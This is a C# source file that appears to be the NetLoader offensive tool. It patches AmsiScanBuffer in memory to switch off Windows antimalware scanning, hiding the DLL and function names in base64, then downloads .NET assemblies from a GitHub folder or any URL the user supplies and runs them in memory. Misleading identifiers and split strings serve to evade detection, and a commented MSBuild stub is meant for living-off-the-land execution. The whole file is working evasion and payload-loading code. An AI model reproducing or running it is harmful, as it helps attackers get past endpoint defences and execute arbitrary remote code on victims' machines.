using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

//This if for MSBuild LOL bin stuff later
//using Microsoft.Build.Framework;
//using Microsoft.Build.Utilities;
public class TotallyNotNt
{
	[DllImport("ker" +"nel" + "32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("ker" +"nel" + "32")]
    private static extern IntPtr LoadLibrary(string name);

    [DllImport("ker" +"nel" + "32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	
    static WebClient leaveMeAlone = new WebClient() { };

 private static void RiddleMeThis(MethodInfo methodHolder, object[] dataArgs = null ){
	//methodHolder.Invoke(null, new object[] { new string[] { arguments } });
	methodHolder.Invoke(0, dataArgs);
}
	
    public static void Main(string[] args)
    {
        Console.WriteLine("[!] ~Flangvik  #NetLoader");
        MoveLifeAhead();

        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                if (args.Length == 0)
                {
                    List<string> binList = GetBins();

                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine("------------------------");
                    Console.WriteLine("[0] - Exit NetLoader");
                    for (int goodGuyNumber = 0; goodGuyNumber < binList.Count; goodGuyNumber++)
                    {
                        Console.WriteLine("[" + (goodGuyNumber + 1) + "] - " + binList[goodGuyNumber]);

                        if (goodGuyNumber == binList.Count - 1)
                        {
                            Console.WriteLine("[" + (goodGuyNumber + 2) + "] - Custom PATH or URL ");
                        }
                    }
                    Console.WriteLine("-----------------------");

                    var rawInput = Console.ReadLine();

                    if (Convert.ToInt32(rawInput) == 0)
                    {
                        System.Environment.Exit(1);

                    }
                    else if (Convert.ToInt32(rawInput) - 1 == binList.Count)
                    {
                        Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                        string binUrl = Console.ReadLine();

                        Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
                        string binArgs = Console.ReadLine();
                        leaveThisAlone("", binArgs, binUrl, false);



                    }
                    else if (Convert.ToInt32(rawInput) - 1 > binList.Count | Convert.ToInt32(rawInput) - 1 < 0)
                    {
                        Console.WriteLine("[!] Bad Input, sry!");
                    }
                    else
                    {
                        Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
                        string binArgs = Console.ReadLine();
                        leaveThisAlone(binList[Convert.ToInt32(rawInput) - 1], binArgs);

                    }
                }
                else
                {

                    string payloadPath = "";
                    string payloadArgs = "";
                    bool base64Decode = false;

                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains("path"))
                        {
                            var argData = Array.IndexOf(args, argument) + 1;
                            if (argData < args.Length)
                            {
                                var rawPayload = args[Array.IndexOf(args, argument) + 1];
                                if (base64Decode)
                                    payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
                                else
                                    payloadPath = rawPayload;
                            }

                        }

                        if (argument.ToLower().Contains("b64"))
                            base64Decode = true;

                        if (argument.ToLower().Contains("args"))
                        {
                            var argData = Array.IndexOf(args, argument) + 1;
                            if (argData < args.Length)
                            {

                                var rawPayloadArgs = args[Array.IndexOf(args, argument) + 1];
                                if (base64Decode)
                                    payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
                                else
                                    payloadArgs = rawPayloadArgs;
                            }
                        }
                    }

                    if (args.Length == 1 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
                    {
                        payloadPath = args[0];
                    }

                    if (args.Length == 2 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
                    {
                        payloadArgs = args[1];
                        payloadPath = args[0];
                    }

                    if (args.Length == 3 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && base64Decode)
                    {
                        payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }

                    if (args.Length == 2 && base64Decode)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }

                    if (!string.IsNullOrEmpty(payloadPath))
                    {
                        Console.WriteLine("[+] Starting {0} with args {1}", payloadPath, payloadArgs);
                        leaveThisAlone("", payloadArgs, payloadPath, false);
                        Environment.Exit(0);
                    }

                    Environment.Exit(0);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Damn, it failed, to bad");
                Console.WriteLine("[!] {0}", ex.Message);
                Environment.Exit(0);
            }
        }
    }


    private static MethodInfo testMe(Assembly asm)
    {
		if(1 == 1)
			return asm.EntryPoint;
		
		return null;
	}


	
	
    private static List<string> GetBins()
    {

        var avBinaries = new List<string>() { };
        var websiteSource = leaveMeAlone.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));

        Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
        foreach (var match in rgx.Matches(websiteSource))
        {
            avBinaries.Add(match.ToString().TrimStart('/'));
        }

        return avBinaries;

    }



    private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
    {
        Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
    }
    private static void MoveLifeAhead(bool BigBoy = false)
    {
        try
        {
            var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
            IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
            uint magicRastaValue = 0x40;

            uint someNumber = 0;

            if (System.Environment.Is64BitOperatingSystem)
            {
                var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };


                VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);

                CopyData(bigBoyBytes, addr);

            }
            else
            {
                var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


                VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);

                CopyData(smallBoyBytes, addr);



            }
                Console.WriteLine("[+] Patched!");

        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] {0}", ex.Message);

        }
    }
	public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
    {		var argHolder = new object[] { new string[] { arguments } };
	
        if (!randomStuff)
        {
            if (!customUrl.StartsWith("http"))
            {
                RiddleMeThis(testMe(Assembly.Load(File.ReadAllBytes(customUrl))),argHolder);
			}
            else
            {
                RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl))),argHolder);
			}
		}	
        else
        {
			RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + binName + "?raw=true"))),argHolder);
	    }
	
    }

}


   


/*
 //This is for MSBuild later
public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        TotallyNotNt.Main(new string[] { });
        return true;
    }
}
*/
